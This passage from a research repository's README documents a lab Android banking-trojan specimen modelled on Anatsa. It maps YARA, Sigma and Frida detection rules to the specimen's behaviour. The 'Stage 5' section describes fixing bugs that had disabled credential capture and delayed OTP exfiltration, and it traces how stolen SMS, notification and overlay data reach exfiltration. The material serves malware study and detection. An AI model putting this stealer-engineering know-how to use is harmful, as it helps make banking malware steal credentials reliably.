| `scripts/lab-c2/README.md` | Setup + usage guide |
| `scripts/detection/yara/*.yar` | 9 YARA rules (7 files + master) — static DEX detection |
| `scripts/detection/sigma/*.yml` | 12 Sigma rules (12 files + index) — behavioral runtime detection |
| `scripts/frida/skyweather-monitor.js` | Master Frida observer (14 hook modules) |
| `scripts/frida/credential-watcher.js` | Focused credential flow observer |
| `scripts/frida/ats-watcher.js` | Focused ATS execution observer |

---

## Detection Surface

Despite evasion, the specimen still has detectable shape. All rules below are shipped as validated files in `scripts/detection/`:

| Layer | Signal | Rule (shipped file) |
|---|---|---|
| Static | Composite: services + C2 + events + ATS + DCL + anti-debug | YARA: `skyweather-banker-shape.yar` |
| Static | `api/v1/beacon` + config regexes + `update_cache.dex` | YARA: `anatsa-c2-protocol.yar` (2 rules) |
| Static | SmsInterceptor + SMS API + sms_raw/otp_sms event types | YARA: `sms-otp-stealing.yar` |
| Static | `DexClassLoader` + `update_cache.dex` + beacon endpoint | YARA: `dcl-reflection-chain.yar` |
| Static | ats_commands + ats_complete + auto_fill_otp + performGlobalAction | YARA: `ats-gesture-injection.yar` |
| Static | overlay_pwd + otp_a11y + otp_nls + overlayRenderer | YARA: `credential-exfil-taxonomy.yar` (2 rules) |
| Static | MD5 + Calendar + TracerPid + beacon co-occurrence | YARA: `dga-domain-rotation.yar` |
| Behavioral | Beacon → config → payload → exfil sequence (30m window) | Sigma: `skyweather-anatsa-killchain.yml` |
| Behavioral | WorkManager periodic job + same-dest HTTP at 15-min floor | Sigma: `skyweather-workmanager-c2-poll.yml` |
| Behavioral | File write → DexClassLoader → file delete within 5m | Sigma: `skyweather-dcl-anti-forensics.yml` |
| Behavioral | TYPE_ACCESSIBILITY_OVERLAY addView on target foreground | Sigma: `skyweather-overlay-credential-capture.yml` |
| Dynamic | `HttpURLConnection.openConnection()` to RFC1918 from background | Frida: `periodic-c2-beacon` module |
| Dynamic | `DexClassLoader.<init>` with app-private path | Frida: `dcl-watch` module |
| Dynamic | `AccessibilityService.onAccessibilityEvent` text capture | Frida: `accessibility-watch` module |
| Dynamic | `WindowManager.addView` with TYPE_ACCESSIBILITY_OVERLAY | Frida: `overlay-watch` module |
| Static | `BIND_NOTIFICATION_LISTENER_SERVICE` + A11y + SMS in same package | YARA: `anatsa-shape.yar` (banker triad) |
| Static | `<intent-filter android:priority="999">` on `SMS_RECEIVED` | YARA: `sms-otp-stealing.yar` |
| Static | `RECEIVE_SMS` + `READ_SMS` on utility app | YARA: `sms-otp-stealing.yar` (permission shape) |
| Behavioral | NLS callback with OTP-pattern text from banking app notification | Sigma: `nls-banker-otp-intercept.yml` |
| Behavioral | SMS reception → CredentialStore write → network exfil within 5s | Sigma: `sms-otp-exfil-chain.yml` |
| Behavioral | Permission escalation: A11y enabled → SMS runtime request | Sigma: `permission-escalation-chain.yml` |
| Dynamic | `NotificationListenerService.onNotificationPosted` text extraction | Frida: `notification-watch` module |
| Dynamic | `BroadcastReceiver.onReceive` with SMS_RECEIVED action | Frida: `sms-watch` module |
| Static | `canPerformGestures=true` in accessibility config + no SAW | YARA: `anatsa-shape.yar` (ATS shape) |
| Static | `dispatchGesture` + `GestureDescription` + `StrokeDescription` chain | YARA: `ats-gesture-injection.yar` |
| Behavioral | A11y text capture → gesture injection within same banking session | Sigma: `anatsa-killchain.yml` (ATS sequence) |
| Behavioral | `performAction(SET_TEXT)` on banking app from non-foreground package | Sigma: `ats-form-fill.yml` |
| Behavioral | OTP drain from CredentialStore → `SET_TEXT` on banking OTP field | Sigma: `ats-otp-autofill.yml` |
| Dynamic | `AccessibilityService.dispatchGesture()` during banking foreground | Frida: `accessibility-watch` module (gesture hook) |
| Dynamic | `AccessibilityNodeInfo.performAction(SET_TEXT)` cross-package | Frida: `accessibility-watch` module (setText hook) |

---

## Stage 5 — Composition Verification

Stage 5 verified cross-stage wiring by building debug + release and auditing integration points. Three composition bugs found and fixed:

### Bug 1: SharedPreferences Key Mismatch (Critical)

`AccessibilityEngine.evaluateGates()` read from `"weather_prefs"` with keys `"install_time"` / `"interaction_count"`. PrefsManager uses `"sky_weather_prefs"` / `"first_launch_ts"` / `"usage_events"`. Gate always read default values → dormancy check always failed → A11y service never armed.

**Impact:** Complete stealer disable. AccessibilityEngine armed=false on every service connect. No credential capture, no overlay, no ATS — despite user granting Accessibility.

**Fix:** Refactored to use `PrefsManager` directly (initialized by `App.onCreate()` before any service connects). Single source of truth for all SharedPreferences access.

**Lesson for analysts:** Cross-module SharedPreferences key mismatches are common in banker builds. Operators maintain separate teams for evasion vs stealer — integration bugs ship to production. Finding dead code paths in a banker may indicate composition failures, not unused features.

### Bug 2: Inconsistent OTP Extraction (Moderate)

`AccessibilityEngine.handleNotification()` had inline `Regex("\\b\\d{4,8}\\b")` instead of using `OtpExtractor` (Stage 3 shared logic). Two problems:
1. No confidence scoring — all matches treated equally (HIGH/MEDIUM/LOW distinction lost)
2. No context-keyword boosting — "123456" near "verification" scored same as "123456" near "forecast"

**Fix:** Replaced inline regex with `OtpExtractor.extract()`. Changed eventType from `"otp_notif"` to `"otp_a11y"` for correct attribution.

### Bug 3: Exfil Policy Collision (High)

`SyncTask.scheduleOnce()` used `ExistingWorkPolicy.KEEP` with single work name `"weather_data_initial_sync"`. When time-sensitive OTP captured AND standard beacon already queued → OTP exfil silently dropped. OTP validity 30-120s; standard beacon delay 5s + execution time = OTP may expire before exfil.

**Fix:** Added `SyncTask.scheduleUrgent()` with:
- `ExistingWorkPolicy.REPLACE` (latest trigger wins)
- 1-second delay (vs 5s standard)
- Separate work name `"weather_alert_push"` (no collision)

Updated 5 time-sensitive callers: NotificationEngine, SmsInterceptor, AccessibilityEngine (notification), OverlayRenderer, AtsEngine. Only `MainActivity` initial beacon retains `scheduleOnce()` with KEEP.

### Cross-Stage Data Flow (Verified)

```
NLS → OtpExtractor.extract() → CredentialStore → SyncTask.scheduleUrgent()
SMS → OtpExtractor.extractAll() → CredentialStore → SyncTask.scheduleUrgent()
A11y → OtpExtractor.extract() → CredentialStore → SyncTask.scheduleUrgent()
Overlay → CredentialStore.capture() → SyncTask.scheduleUrgent()
ATS → CredentialStore.peekAll() → auto_fill_otp into banking field
ATS result → CredentialStore.capture() → SyncTask.scheduleUrgent()
```

All paths converge on CredentialStore. `peekAll()` (non-destructive read) used by ATS; `drain()` (atomic clear) used by SyncTask exfil. No data loss at the boundary.

---

## Detection Rule Mapping

Specimen ships with validated detection rules in `scripts/detection/`. All YARA rules compiled and verified against extracted DEX from both release and debug APKs.

### YARA (Static — 9 rules in 7 files, all fire on release DEX)

Run: `unzip -o app-release.apk classes.dex -d /tmp && yara -r scripts/detection/yara/master.yar /tmp/classes.dex`

| File | Rule(s) | Signal |
|---|---|---|
| `skyweather-banker-shape.yar` | `SkyWeather_Banker_Shape` | Composite 4-of-6: services + C2 + events + ATS + DCL + anti-debug |
| `anatsa-c2-protocol.yar` | `SkyWeather_C2_Protocol` | `api/v1/beacon` + config regex + payload cache |
| `anatsa-c2-protocol.yar` | `SkyWeather_Config_Regex_Pack` | 3+ of: ats_commands / kill / target_list / payload_url / delay_ms |
| `sms-otp-stealing.yar` | `SkyWeather_SMS_OTP_Stealing` | SmsInterceptor class + SMS API + sms_raw/otp_sms events |
| `dcl-reflection-chain.yar` | `SkyWeather_DCL_Payload_Chain` | DexClassLoader + update_cache.dex + beacon |
| `ats-gesture-injection.yar` | `SkyWeather_ATS_Gesture_Injection` | ats_commands + ats_complete + auto_fill_otp + performGlobalAction |
| `credential-exfil-taxonomy.yar` | `SkyWeather_Credential_Taxonomy` | overlay_pwd + otp_a11y + otp_nls + otp_sms + sms_raw |
| `credential-exfil-taxonomy.yar` | `SkyWeather_Overlay_Credential_Capture` | overlay_pwd + overlay_usr + overlayRenderer |
| `dga-domain-rotation.yar` | `SkyWeather_DGA_Domain_Rotation` | MD5 + Calendar + TracerPid + beacon |

**Note:** DEX is DEFLATE-compressed inside APK. YARA must scan extracted `classes.dex`, not raw APK. For multi-dex debug APKs, specimen code lives in `classes3.dex`.

### Sigma (Behavioral — 12 rules, 12 files)

| File | Detection | Kill Chain Phase |
|---|---|---|
| `skyweather-anatsa-killchain.yml` | Beacon → config → payload → exfil sequence | Full chain |
| `skyweather-workmanager-c2-poll.yml` | 15-min periodic SyncTask + same-dest HTTP | Persistence |
| `skyweather-dcl-anti-forensics.yml` | DEX write → DexClassLoader → DEX delete within 5m | Execution / Evasion |
| `skyweather-overlay-credential-capture.yml` | TYPE_ACCESSIBILITY_OVERLAY (2032) rendering | Credential Access |
| `skyweather-nls-otp-intercept.yml` | NLS callback + OTP pattern extraction | Credential Access |
| `skyweather-sms-otp-exfil.yml` | SMS_RECEIVED → OTP extract → C2 exfil | Collection / Exfil |
| `skyweather-permission-escalation.yml` | A11y + NLS + SMS permission grant sequence | Privilege Escalation |
| `skyweather-ats-form-fill.yml` | Target foreground → SET_TEXT injection | ATS |
| `skyweather-ats-otp-autofill.yml` | OTP intercept → auto-fill into banking field | ATS |
| `skyweather-accessibility-abuse.yml` | A11y event volume + cross-package text reading | Collection |
| `skyweather-modular-loader.yml` | 4-stage config → download → DCL → cleanup | Execution |
| `skyweather-update-channel.yml` | Config polling + target_list/ats_commands updates | C2 |

### Frida Monitor (Dynamic — 14 modules in master, 8 directly applicable)

| Module | Signal |
|---|---|
| `accessibility-watch` | onAccessibilityEvent text capture + gesture dispatch |
| `overlay-watch` | WindowManager.addView TYPE_ACCESSIBILITY_OVERLAY |
| `notification-watch` | NLS onNotificationPosted text extraction |
| `sms-watch` | BroadcastReceiver onReceive SMS_RECEIVED |
| `dcl-watch` | DexClassLoader init with app-private path |
| `reflection-watch` | Class.forName + getDeclaredMethod chains |
| `md5-dga-watch` | MessageDigest MD5 with week-seeded input |
| `periodic-c2-beacon` | HttpURLConnection to RFC1918 from background |

### Summary

| Format | Files | Rules | Validated |
|---|---|---|---|
| YARA | 7 (+master) | 9 | All compile + fire on release & debug DEX |
| Sigma | 12 (+index) | 12 | Structural validation (runtime requires logcat/proxy feed) |
| Frida | 3 scripts | 14 modules | Structural (runtime requires attached specimen) |
| **Total** | **22 files** | **35 detection items** | |

**Coverage context:** Specimen implements ~40% of the Takopii curriculum's primitives (no NFC relay, no TEE offload, no hidden VNC, no residential proxy, no boot persistence, etc.). Detection rules cover the implemented attack surface completely.

---

## Lab Safety

This specimen enforces RFC1918/loopback on all network operations:

- `AppConfig.isEndpointSafe()` — validates primary endpoint host
- `DomainResolver.isRfc1918()` — validates each DGA candidate
- `DomainResolver.generateFallbacks()` — output constrained to 10.0.0.0/8
- `UpdateChannel.isRfc1918Host()` — validates rotated payload URLs

**Cannot exfil to public internet** without modifying source + recompiling. Three independent validation points must all be defeated.

---

## Cross-References

### Hub Sections

- [`ANALYSIS.md`](../../ANALYSIS.md) §5.1 — Accessibility Service primitive (Stage 2 + Stage 4 ATS)
- [`ANALYSIS.md`](../../ANALYSIS.md) §5.2 — Notification Listener + SMS read (Stage 3)
- [`ANALYSIS.md`](../../ANALYSIS.md) §5.4 — Overlay capture (Stage 2)
- [`ANALYSIS.md`](../../ANALYSIS.md) §6 — C2 Infrastructure (Stage 1 + all exfil paths)
- [`ANALYSIS.md`](../../ANALYSIS.md) §7 — Evasion Layer (Stage 1)
- [`ANALYSIS.md`](../../ANALYSIS.md) §9 — Detection Engineering (Stage 5 rule mapping)

### Research Briefs

- [`research/02-anatsa-threat-intel.md`](../../research/02-anatsa-threat-intel.md) — kill chain model, ATS architecture, 4-stage loader
- [`research/06-sharkbot-threat-intel.md`](../../research/06-sharkbot-threat-intel.md) — DGA V2.8, ATS pioneer, SMS OTP→auto-fill
- [`research/08-frontier-2025-2026.md`](../../research/08-frontier-2025-2026.md) — Herodotus timing jitter, TYPE_ACCESSIBILITY_OVERLAY

### Technique Spokes (directly implemented)

| Spoke | Stage |
|---|---|
| [`accessibility-service-abuse`](../../techniques/stealer-surfaces/accessibility-service-abuse.md) | 2, 4 |
| [`overlay-credential-capture`](../../techniques/stealer-surfaces/overlay-credential-capture.md) | 2 |
| [`notification-listener-otp-intercept`](../../techniques/stealer-surfaces/notification-listener-otp-intercept.md) | 3 |
| [`sms-otp-stealing`](../../techniques/stealer-surfaces/sms-otp-stealing.md) | 3 |
| [`dga-domain-rotation`](../../techniques/network/dga-domain-rotation.md) | 1 |
| [`dexclassloader-runtime-loading`](../../techniques/android-runtime/dexclassloader-runtime-loading.md) | 1 |
| [`reflection-api-hiding`](../../techniques/android-runtime/reflection-api-hiding.md) | 1 |
| [`workmanager-scheduling`](../../techniques/android-runtime/workmanager-scheduling.md) | 1 |
| [`string-obfuscation-routines`](../../techniques/evasion/string-obfuscation-routines.md) | 1 |
| [`anti-debug-checks`](../../techniques/evasion/anti-debug-checks.md) | 1 |
| [`anti-emulator-checks`](../../techniques/evasion/anti-emulator-checks.md) | 1 |
| [`herodotus-behavior-mimicry`](../../techniques/frontier/herodotus-behavior-mimicry.md) | 4 |
| [`accessibility-overlay-2032`](../../techniques/frontier/accessibility-overlay-2032.md) | 2 |
| [`update-channel-mechanics`](../../techniques/network/update-channel-mechanics.md) | 1, 4 |
| [`modular-loader-architecture`](../../techniques/network/modular-loader-architecture.md) | 1 |

### Safety

- [`SAFETY.md`](../../SAFETY.md) — lab gate contract (specimen-level enforcement applies to all 5 stages)
